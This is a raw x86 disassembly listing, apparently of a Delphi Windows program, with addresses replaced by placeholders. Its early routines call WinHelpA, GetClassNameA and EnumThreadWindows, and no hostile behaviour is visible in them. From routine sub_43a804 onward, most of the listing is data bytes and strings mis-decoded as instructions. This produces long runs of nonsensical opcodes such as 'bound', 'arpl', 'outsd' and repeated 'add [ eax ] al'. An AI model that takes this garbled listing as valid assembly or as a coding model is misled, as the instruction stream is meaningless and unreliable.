push 0x0
push 0x3
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_439f44
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a03c
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea ecx [ ebp - 0x1c ]
xor edx edx
mov eax ebx
call sub_439c90
mov eax [ ebp - 0x1c ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov ecx 0x1
mov eax r-xdata
call sub_408f18
mov eax ebx
call sub_43a5d4
test al al
je r-xdata
mov ecx sub_439ae4
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b894
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a043
lea eax [ ebp - 0x1c ]
call sub_404038
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40405c
retn
lea ecx [ ebp - 0x8 ]
xor edx edx
mov eax ebx
call sub_439c90
push 0x0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax ebx
call sub_43a52c
test al al
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
mov edx [ ebp - 0x4 ]
call sub_40408c
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
push 0x102
mov eax [ ebp - 0x8 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a0ac
push ebx
mov ebx eax
mov eax ebx
call sub_43a090
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea eax [ ebx + 0x1c ]
call sub_405928
pop ebx
retn
mov eax rw-data
call sub_405928
sub_43a0dc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a134
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a13b
lea eax [ ebp - 0x4 ]
call sub_404038
retn
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_439c90
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
mov ebx eax
sub_43a144
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x110 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a23a
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x10c ] esi
mov [ ebp - 0x108 ] 0xb
lea eax [ ebp - 0x10c ]
push eax
push 0x0
mov ecx r-xdata
lea eax [ ebp - 0x104 ]
mov edx 0xff
call sub_408ed8
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_439c90
mov eax ebx
call sub_43a5d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a241
lea eax [ ebp - 0x110 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push 0x0
lea eax [ ebp - 0x110 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042a8
mov ecx [ ebp - 0x110 ]
mov dl 0x1
mov eax ebx
call sub_43a52c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x1
lea eax [ ebx + 0x14 ]
lea edx [ ebp - 0x104 ]
mov ecx 0x100
call sub_4042a8
lea eax [ ebp - 0x104 ]
push eax
push 0x102
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a258
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_43a2ba
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a2c1
lea eax [ ebp - 0x8 ]
call sub_404038
retn
lea ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_439c90
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
mov ebx eax
sub_43a2cc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_43a34c
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_439c90
mov eax ebx
call sub_43a5d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a353
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push esi
xor ecx ecx
xor edx edx
mov eax ebx
call sub_43a52c
test al al
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov [ ebx + 0x10 ] 0x0
mov [ ebx + 0x18 ] esi
push esi
push 0x1
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ ebx + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a45c
push ebp
mov ebp esp
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_408950
test eax eax
jne r-xdata
mov al [ ebx + 0xc ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0x4 ] esi
mov [ ebx + 0xc ] 0x1
sub_43a4b7
add [ ebp - 0x75 ] dl
in al dx
add esp 0xffffff00
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
push 0x100
lea eax [ ebp - 0x100 ]
push eax
push esi
call GetClassNameA
mov edx r-xdata
lea eax [ ebp - 0x100 ]
call sub_40892c
test eax eax
jne r-xdata
mov al [ ebx + 0xd ]
xor al 0x1
neg al
sbb eax eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov [ ebx + 0xd ] 0x1
mov [ ebx + 0x8 ] esi
sub_43a52c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4044e8
xor eax eax
push ebp
push sub_43a5a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x1
lea eax [ ebp - 0x18 ]
call sub_43a510
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a5a9
lea eax [ ebp - 0x4 ]
call sub_404038
retn
cmp bl [ esi + 0x10 ]
jne r-xdata
sub bl 0x1
jb r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ esi + 0x18 ]
setne [ ebp - 0x5 ]
jne r-xdata
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_407f30
test eax eax
setne [ ebp - 0x5 ]
jmp r-xdata
sub_43a5b8
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov al [ esp + 0xd ]
xor al 0x1
add esp 0x10
pop edi
pop esi
retn
sub_43a5d4
push ebx
push esi
add esp 0xfffffff0
mov esi eax
xor ebx ebx
mov eax esp
call sub_43a510
cmp [ esp + 0xc ] 0x0
je r-xdata
mov edx esp
mov eax esi
call sub_43a5b4
test al al
jne r-xdata
mov eax esp
push eax
push r-xdata
push 0x0
mov eax [ esp + 0x10 ]
push eax
call __imp_GetWindowThreadProcessId
push eax
call EnumThreadWindows
mov eax ebx
add esp 0x10
pop esi
pop ebx
retn
mov edx esp
mov eax esi
call sub_43a5b8
test al al
je r-xdata
mov bl 0x1
mov eax esi
call sub_43a630
sub_43a630
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi eax
xor eax eax
push ebp
push sub_43a6ad
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_43a090
call GetTickCount
mov ebx eax
push 0x0
call sub_406490
call GetTickCount
sub eax ebx
cmp eax 0x3e8
jbe r-xdata
lea ecx [ ebp - 0x4 ]
xor edx edx
mov eax esi
call sub_439c90
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a6b4
lea eax [ ebp - 0x4 ]
call sub_404038
retn
push 0x0
push 0x9
mov eax [ ebp - 0x4 ]
call sub_4044f8
push eax
mov eax [ esi + 0x1c ]
mov edx [ eax ]
call [ edx + 0xc ]
push eax
call WinHelpA
sub_43a6bc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4032b8
mov eax rw-data
mov edx esi
test edx edx
je r-xdata
add esp 0xfffffff0
call sub_40360c
call sub_405940
mov eax esi
test bl bl
je r-xdata
sub edx 0xffffffe0
mov eax esi
pop esi
pop ebx
retn
call sub_403664
pop [ fs : 0x0 ]
add esp 0xc
sub_43a704
push ebx
push esi
call sub_403674
mov ebx edx
mov esi eax
xor eax eax
mov [ rw-data ] eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4032d8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40365c
sub_43a730
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a79e
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a7a5
retn
mov eax [ rw-data ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax rw-data
call sub_405928
mov eax rw-data
call sub_405928
mov eax rw-data
call sub_405928
mov eax rw-data
call sub_404038
mov eax rw-data
call sub_405928
mov eax [ rw-data ]
call sub_439d60
sub_43a7a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43a7fa
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43a801
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_43a6bc
mov [ rw-data ] eax
mov eax [ rw-data ]
add eax 0x1c
call sub_405928
mov edx eax
mov eax [ rw-data ]
call sub_428af0
sub_43a804
or [ eax + 0xc010043 ] ch
push esp
dec ebp
outsd
popad
insb
push edx
jae r-xdata
inc ebx
outsd
insb
je r-xdata
cmp al 0xd2
outsd
insb
jae r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
inc ebx
add [ edx + edx * 8 + 0x35440043 ] cl
inc eax
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + edx - 0x57 ] si
inc ebx
add [ edi ] al
or edx [ esp + eax * 2 + 0x72 ]
popad
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax - 0x58 ] si
inc ebx
add [ ecx + edx + 0x40 ] dh
add [ eax ] al
add [ eax ] cl
inc ebx
outsd
outsb
je r-xdata
nop
and al 0xa8
inc ebx
add [ ecx ] al
pop es
push esp
inc ebx
jne r-xdata
inc eax
add al ah
test al 0x43
add [ eax ] al
add [ eax ] al
inc ebx
add [ eax + eax ] dh
add [ eax ] al
and [ ecx ] dl
inc eax
add [ eax ] dh
xor eax 0xd29c0040
inc ebx
add [ edx + edx * 8 + 0x35440043 ] cl
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xa9
jae r-xdata
add [ edx + ebp * 4 + 0x43 ] dh
inc esp
jb r-xdata
add [ edx + edx * 8 ] bh
inc ebx
add ah bh
rol [ ebx ] cl
lodsb [ esi ]
rol [ ebx ] cl
push ss
push esp
inc edx
popad
jae r-xdata
outsd
insb
jae r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ edx + edx * 8 - 0x2d73ffbd ] bl
inc ebx
add [ ebp + esi + 0x40 ] al
inc ebx
add [ ebx ] cl
push esp
inc esp
jb r-xdata
inc ebx
add ah bl
rol [ ebx ] 0x1
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebp * 4 ] al
jb r-xdata
inc eax
add [ edx + edx * 8 - 0x2d73ffbd ] bl
inc ebx
add [ ebp + esi + 0x40 ] al
test eax 0x35300043
inc ebx
add [ eax ] al
je r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] ch
rol [ ebx ] cl
sbb dl dl
inc ebx
add [ edx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl dl 0x1
inc ebx
add ah bl
rol [ ebx ] 0x1
xor dl dl
inc ebx
add [ edx + edx * 8 ] dh
inc ebx
add [ ebx + 0x43a984c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c0043a9 ] dh
add [ eax ] al
add [ eax + ebp * 4 + 0x35300043 ] dl
inc eax
add [ edx + edx * 8 - 0x2d73ffbd ] bl
inc ebx
add [ ebp + esi + 0x40 ] al
add [ eax + 0x7fffffff ] al
add [ eax ] al
mov eax eax
cmp al 0xa8
inc ebx
add [ ebx ] al
push es
push esp
inc ecx
insb
imul esp [ edi + 0x6e ] 0x1
add [ esi ] al
add [ eax ] al
add [ eax ] bh
test al 0x43
add [ esi ] al
popad
insb
dec esi
outsd
outsb
add eax 0x6f546c61
jo r-xdata
rol [ ebx ] cl
mov al [ 0xfffffffffc0043d3 ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x2c ] si
stosb [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
stosd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
cld
int3
add [ eax ] al
add [ eax ] al
cmp [ ecx + 0x35300043 ] ch
inc ebx
inc eax
add [ eax ] ch
rol [ ebx ] cl
pop esp
rol [ ebx ] cl
je r-xdata
rol [ ebx ] cl
inc esp
xor eax 0x35380040
inc eax
add [ eax - 0x63ffbfce ] al
xor al [ eax ]
fdiv [ edx ]
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x34 ] si
test eax 0x16070043
push esp
inc edx
popad
jae r-xdata
push es
popad
insb
dec esp
je r-xdata
popad
insb
inc edx
outsd
je r-xdata
inc ebx
add [ eax + 0x140043d5 ] ah
inc ebx
outsd
outsb
je r-xdata
test eax 0x35300043
inc eax
add [ edx + edx * 8 - 0x2c3fffbd ] bl
inc ebx
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi + 0x32d80040 ] bl
inc eax
add [ eax ] ch
rol [ ebx ] cl
pop esp
rol [ ebx ] cl
je r-xdata
rol [ ebx ] cl
lodsb [ esi ]
rol [ ebx ] cl
adc al 0x54
inc esp
jb r-xdata
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
rcl dl 0x1
inc ebx
add ah bl
rol [ ebx ] 0x1
adc bl 0x43
add [ edx + edx * 8 ] dh
inc ebx
add [ eax - 0x3ffbc2d ] ah
inc eax
add [ edx + esi + 0x32d80040 ] bl
cmp [ 0x32800040 ] dh
inc esp
jb r-xdata
or [ ecx + 0x6c ] ah
inc ebx
insb
imul esp [ ebp + 0x6e ] 0x6c610874
inc ebx
jne r-xdata
popad
insb
push edx
imul esp [ edi + 0x68 ] 0x6c610874
inc eax
add ah dl
rol [ ebx ] 0x1
sbb dl dl
inc ebx
add [ edx + edx * 8 ] dl
inc ebx
add [ eax ] bl
rol [ ebx ] 0x1
jl r-xdata
xor al [ eax ]
fdiv [ edx ]
outsd
insd
inc ebx
add [ eax ] dh
xor eax 0xd29c0040
inc ebx
add [ ebp + edx * 8 + 0x35440043 ] dh
inc eax
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp + esi * 4 - 0x55 ] si
inc ebx
add [ edi ] al
andps xmm0 [ edx + esi * 2 + 0x61 ]
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ esp - 0x55 ] si
inc ebx
add al cl
test eax 0x43
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
add [ edx + edx * 8 ] bh
inc ebx
add [ esp + edx * 8 - 0x2c3bffbd ] dh
inc ebx
add ah bh
aam 0x43
add [ eax - 0x2b ] bh
inc ebx
add [ ebp + edx * 8 - 0x2a53ffbd ] cl
inc ebx
add [ edi ] cl
push esp
inc esp
jb r-xdata
rol [ ebx ] cl
xor al 0xd2
rol [ ebx ] cl
sbb cl dl
inc ebx
add [ eax - 0x2c ] bl
inc ebx
add ah bl
rol [ ebx ] 0x1
xor dl dl
inc ebx
add [ edx + edx * 8 ] dh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
lea eax [ eax ]
stosd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x700043ab ] ah
add [ eax ] al
add [ eax ] bh
test eax 0x35300043
inc eax
add [ edx + edx * 8 - 0x2d73ffbd ] bl
inc ebx
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x2bd7ffc0 ] bl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d5 ]
add [ eax ] bh
xor eax 0x32800040
inc ebx
outsd
outsb
je r-xdata
xor dl dl
inc ebx
add [ edx + edx * 8 ] dh
je r-xdata
inc ecx
inc esp
outsd
arpl [ ebx + 0x4f ] bp
bound ebp [ edx + 0x65 ]
arpl [ ebp + eax * 2 + 0x78 ] si
mov eax eax
les ebp [ ebx + eax * 2 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dh
lodsb [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bl
lodsb [ esi ]
inc ebx
add [ eax + eax ] ah
add [ esi + ebp * 8 + 0x35300041 ] bl
inc eax
add [ esi + 0x35400040 ] bh
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x187bffc0 ] bl
inc ebx
add al bh
jpo r-xdata
add [ edx + edx * 8 ] bh
inc ebx
add [ esp + edx * 8 - 0x2c3bffbd ] dh
inc ebx
add ah bh
aam 0x43
add [ eax - 0x2b ] bh
inc ebx
add [ ebp + edx * 8 - 0x2a53ffbd ] cl
inc ebx
add [ ecx ] dl
push esp
inc esp
jb r-xdata
outsd
insb
jae r-xdata
add [ eax ] bl
rol [ ebx ] 0x1
rcl dl 0x1
inc ebx
add ah bl
rol [ ebx ] 0x1
adc bl 0x43
add [ edx + edx * 8 ] dh
inc ebx
add [ ebx + edx * 8 + 0x43 ] dh
outsd
insb
dec edi
bound ebp [ edx + 0x65 ]
arpl [ esp + eax * 4 - 0x57 ] si
inc ebx
add [ eax ] dl
test eax 0x43
or [ ebx + 0x6f ] al
outsb
je r-xdata
inc ebx
add [ edx + edx * 8 ] bh
inc ebx
add [ eax ] dh
rol [ ebx ] cl
xor al 0xd2
outsb
je r-xdata
insd
or [ ebx + 0x6f ] al
xor eax 0x32800040
inc eax
add [ edx + esi - 0x270bffc0 ] bl
inc ecx
add ah dh
jmp 0xffffffffd96badad
outsd
insb
inc ebx
popad
outsb
jbe r-xdata
add al 0x0
or [ ebx + 0x6f ] al
add [ eax ] al
jl r-xdata
add [ eax ] bh
xor eax 0x32800040
inc eax
add [ edx + esi - 0x2bd7ffc0 ] bl
inc ebx
add [ eax ] ch
rol [ ebx ] cl
mov al [ 0x140043d5 ]
rol [ ebx ] cl
sbb cl dl
inc ebx
add [ eax - 0x2c ] bl
inc ebx
add ah bl
rol [ ebx ] 0x1
xor dl dl
inc ebx
add [ edx + edx * 8 ] dh
inc ebx
add [ ebx + 0x43ac28c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 4 + 0x43 ] ah
add [ eax ] dh
add [ eax ] al
sbb [ ebx + 0x35300043 ] ch
inc eax
add [ edx + edx * 8 - 0x2a4bffbd ] bl
inc ebx
add [ ebp + esi + 0x40 ] al
inc ebx
add [ eax - 0x3ffbc2d ] ah
rol [ ebx ] cl
lodsb [ esi ]
rol [ ebx ] cl
adc dl [ esp + eax * 2 + 0x72 ]
popad
inc ebx
outsd
outsb
je r-xdata
outsd
insb
jae r-xdata
add [ eax + 0x35 ] al
jae r-xdata
inc ecx
add [ eax ] al
jmp r-xdata
outsd
insb
jae r-xdata
outsb
je r-xdata
outsd
add [ ebx + edi * 2 ] dl
inc ecx
add al cl
adc eax 0x15b40042
inc edx
add [ eax + 0xe0043e7 ] dh
push esp
inc ebx
outsd
outsb
je r-xdata
add [ ebp - 0x55b7ffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebx
add [ esp + ebp * 8 + 0x43 ] bh
add [ ebx + eax * 8 ] ch
inc esp
add [ eax ] dh
retn
inc eax
add [ ebp + esi + 0x40 ] al
add [ eax ] bh
add [ ebp - 0x529bffc0 ] cl
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
lodsd [ esi ]
inc ebx
add [ eax + eax ] bl
add [ eax ] al
insb
mov ebx 0x35300044
inc eax
add [ esi + 0x35400040 ] bh
sub_43aff2
inc ebx
add [ eax ] dl
push esp
push ebx
imul edi [ edx + 0x65 ] 0x736e6f43
je r-xdata
dec ebp
popad
js r-xdata
popad
imul ebp [ esi + 0x74 ] r-xdata
or al 0xb0
inc ebx
add [ edi ] al
adc [ ebx + edx * 2 + 0x69 ] dl
jpe r-xdata
jne r-xdata
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
adc [ eax ] al
add bh bh
push esp
jmp r-xdata
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
push esp
dec ebp
outsd
inc ebp
jbe r-xdata
nop
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x6 ] si
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
or [ ebp + 0x69 ] ecx
outsb
dec eax
imul esp [ gs : edi + 0x68 ] 0x43af7474
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x3 ] si
dec ebp
outsd
jbe r-xdata
jne r-xdata
inc eax
outsb
je r-xdata
arpl [ gs : eax + eax + 0x5 ] si
je r-xdata
outsb
je r-xdata
inc ebx
add [ eax ] dl
add [ eax ] al
call [ ecx + ebp * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ ecx ] cl
dec ebp
imul ebp [ esi + 0x48 ] 0x68676965
je r-xdata
scasd [ edi ]
imul ebp [ esi + 0x74 ] 0x43afe073
add [ ebx + edx * 2 + 0x40041 ] cl
or [ ebx + 0x6f ] al
add [ 0x66696853 ] al
je r-xdata
push edi
outsd
jb r-xdata
or [ esi ] al
inc ebp
jbe r-xdata
add eax 0x65530608
outsb
jb r-xdata
push 0x53746669
je r-xdata
je r-xdata
push ebx
push 0xb746669
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
outsb
or al 0x54
dec ebp
outsd
jne r-xdata
add [ eax + eax ] dl
add bh bh
push esp
jmp r-xdata
inc ebx
outsd
insb
jae r-xdata
dec ecx
outsb
je r-xdata
scasd [ edi ]
add [ ecx + edx + 0x40 ] dh
add [ eax + 0x4010 ] al
push esp
push ebx
inc esp
jb r-xdata
dec ebx
jns r-xdata
add [ ebx ] eax
outsb
jb r-xdata
outsb
je r-xdata
inc edx
jne r-xdata
add [ esi ] al
push esp
dec edi
push es
or [ esi ] al
push ebx
outsb
je r-xdata
popad
add [ ecx ] al
je r-xdata
inc edx
jne r-xdata
add [ eax ] cl
add [ eax ] al
call [ ecx + ebp * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] cl
dec ebp
popad
js r-xdata
add [ edi + ebp * 4 + 0x43 ] dh
je r-xdata
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
popad
outsb
add [ ecx + edx + 0x40 ] dh
add [ ecx + edx + 0x40 ] dh
dec edi
jbe r-xdata
add al 0x8
push es
push ebx
outsb
jb r-xdata
push ebx
outsd
jne r-xdata
or [ esi ] al
jb r-xdata
dec esp
inc ecx
add [ eax + r-xdata ] dl
adc [ eax ] 0x40
add [ eax ] al
jb r-xdata
push esp
push ebx
push 0x53746669
je r-xdata
je r-xdata
imul esp [ edi + 0x68 ] 0x43af7474
imul esp [ gs : edi + 0x68 ] 0x43af7474
add [ eax + eax ] cl
add bh bh
push esp
jmp r-xdata
add [ ecx + 0x7 ] ebx
dec ecx
outsb
je r-xdata
or [ esi ] al
arpl [ ebp + 0x7 ] sp
pop eax
pop es
dec ecx
add [ ecx ] al
jae r-xdata
je r-xdata
inc esp
jb r-xdata
je r-xdata
jb r-xdata
add [ 0x66696853 ] al
je r-xdata
push esp
add [ ecx + 0x7 ] ebx
dec ecx
outsb
pop eax
pop es
dec ecx
outsb
or edx [ ebx + edx * 2 + 0x68 ]
outsb
add [ 0x66696853 ] al
je r-xdata
jns r-xdata
je r-xdata
jb r-xdata
or [ esi ] al
push ebx
outsd
jne r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x6 ] si
jb r-xdata
jb r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
push esp
inc esp
jb r-xdata
add [ eax + r-xdata ] dl
or [ esi ] cl
add [ eax + edx + 0x40 ] dl
add [ eax + edx + 0x40 ] dl
add [ eax - 0x52 ] dh
inc eax
inc esp
jb r-xdata
jbe r-xdata
push esp
dec ebx
jns r-xdata
inc ebx
add [ eax ] cl
push cs
jb r-xdata
add [ ecx ] al
pop eax
pop es
push esp
push ebx
push 0x53746669
je r-xdata
ror [ ebx - r--data ] cl
dec ebp
inc ebp
add [ eax ] al
add [ eax ] al
je r-xdata
je r-xdata
arpl [ ebp + 0x7 ] sp
push esp
dec edi
add [ ecx + 0x7 ] ebx
dec ecx
jb r-xdata
outsb
je r-xdata
outsb
je r-xdata
outsb
je r-xdata
inc ebp
jbe r-xdata
popad
jb r-xdata
inc ebp
jbe r-xdata
or [ edx ] ecx
inc esp
jb r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + ecx + 0xa ] si
push esp
adc [ eax ] al
